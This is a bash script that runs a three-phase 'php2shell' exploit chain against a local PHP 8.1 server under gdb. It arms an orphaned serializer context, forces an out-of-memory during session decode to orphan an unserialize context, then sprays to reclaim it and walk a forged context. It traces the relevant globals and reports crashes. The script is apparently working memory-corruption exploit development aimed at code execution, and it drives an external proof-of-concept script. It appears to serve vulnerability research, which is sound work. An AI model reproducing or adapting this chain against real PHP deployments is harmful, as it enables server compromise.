#!/bin/bash
# Full 3-phase php2shell chain under gdb: arm (serialize orphan + big sess file),
# p1 (decode OOM -> unserialize orphan), fire (spray reclaim + tmp_var walk).
# Args: port [p1_spray] [fire_spray] [mem]
set -u
PORT=${1:-18110}
P1SP=${2:-600}
FSP=${3:-700}
MEM=${4:-8M}
AF=${5:-12}
ROOT=/tmp/php2shell5
SID=u0123456789abcdefghijklmnopqrstuv
POC=/mnt/c/Users/andre/Downloads/php2shell-claude/poc_unserialize.py

pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null; sleep 0.3
rm -rf "$ROOT"; mkdir -p "$ROOT/sess"
cp /mnt/c/Users/andre/Downloads/php2shell-claude/lab_index.php "$ROOT/index.php"

cat > "$ROOT/bg.gdb" << EOF
set pagination off
set confirm off
set debuginfod enabled off
set breakpoint pending on
break php_var_serialize_init
commands
silent
printf "S_INIT %u %p\n", *(unsigned int*)((char*)&basic_globals+3368), *(void**)((char*)&basic_globals+3360)
continue
end
break php_var_serialize_destroy
commands
silent
printf "S_DESTR %u %p\n", *(unsigned int*)((char*)&basic_globals+3368), *(void**)((char*)&basic_globals+3360)
continue
end
break php_var_unserialize_init
commands
silent
printf "U_INIT %u %p\n", *(unsigned int*)((char*)&basic_globals+3384), *(void**)((char*)&basic_globals+3376)
continue
end
break php_var_unserialize_destroy
commands
silent
printf "U_DESTR %u %p\n", *(unsigned int*)((char*)&basic_globals+3384), *(void**)((char*)&basic_globals+3376)
continue
end
set logging file $ROOT/trace.log
set logging enabled on
run -d memory_limit=$MEM -d display_errors=0 -d post_max_size=32M -d upload_max_filesize=32M -d max_file_uploads=25 -d session.upload_progress.min_freq=0 -d session.save_path=$ROOT/sess -S 127.0.0.1:$PORT -t $ROOT
EOF

gdb -q -x "$ROOT/bg.gdb" /usr/bin/php8.1 > "$ROOT/gdb.log" 2>&1 &
GDB=$!
UP=0
for i in $(seq 1 60); do
  if curl -s -o /dev/null --max-time 2 http://127.0.0.1:$PORT/index.php; then UP=1; break; fi
  sleep 0.5
done
[ "$UP" = 1 ] || { echo SERVER-NEVER-UP; kill $GDB 2>/dev/null; exit 1; }

echo "=== phase 1: arm ==="
timeout 60 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" \
  --skip-p1 --skip-fire --arm-files "$AF" 2>&1 | grep -E 'arm |status'
ls -la "$ROOT/sess" 2>/dev/null | tail -2
# arm's bailout leaked a flock'd fd on the sess file; rm it so later opens hit
# a fresh inode (the stale-PS(id) flush rewrites the dangling ~1MB tree into
# the new file, so the decode target regenerates itself)
rm -f "$ROOT/sess/sess_$SID"
echo "(arm sess file removed)"

echo "=== phase 2: pressure (decode OOM -> unserialize orphan) ==="
timeout 60 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" \
  --skip-arm --skip-fire --p1-spray "$P1SP" 2>&1 | grep -E 'p1  |status'
ls -la "$ROOT/sess" 2>/dev/null | tail -2

echo "=== phase 3: fire (reclaim + forged context walk) ==="
timeout 60 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" \
  --skip-arm --skip-p1 --fire-sid "$SID" --spray "$FSP" 2>&1 | grep -E 'fire |status|HIT'
sleep 1
if kill -0 $GDB 2>/dev/null; then echo "SERVER ALIVE (no crash)"; else echo "SERVER DEAD *** CRASH ***"; fi
kill $GDB 2>/dev/null; pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null; sleep 0.5

echo "=== trace analysis ==="
python3 - "$ROOT/trace.log" << 'PYEOF'
import sys
try:
    lines = [l.strip().split() for l in open(sys.argv[1], errors='replace')
             if l.startswith(('U_INIT','U_DESTR','S_INIT','S_DESTR'))]
except FileNotFoundError:
    print('no trace'); raise SystemExit
def orphans(iname, dname):
    seq = [l for l in lines if l[0] in (iname, dname)]
    out = []
    for i, l in enumerate(seq):
        if l[0] == iname and (i + 1 >= len(seq) or seq[i+1][0] != dname):
            out.append(l[3] if len(l) > 3 else '?')
    return out
print('S-orphans:', orphans('S_INIT', 'S_DESTR'))
print('U-orphans:', orphans('U_INIT', 'U_DESTR'))
ru = [l for l in lines if l[0] == 'U_INIT' and len(l) > 2 and l[2] not in ('0',)]
rs = [l for l in lines if l[0] == 'S_INIT' and len(l) > 2 and l[2] not in ('0',)]
print('U-REUSE lines:', [' '.join(l) for l in ru][:6])
print('S-REUSE lines:', [' '.join(l) for l in rs][:6])
print('total lines:', len(lines))
PYEOF
echo "=== gdb tail (crash?) ==="
tail -12 "$ROOT/gdb.log" 2>/dev/null
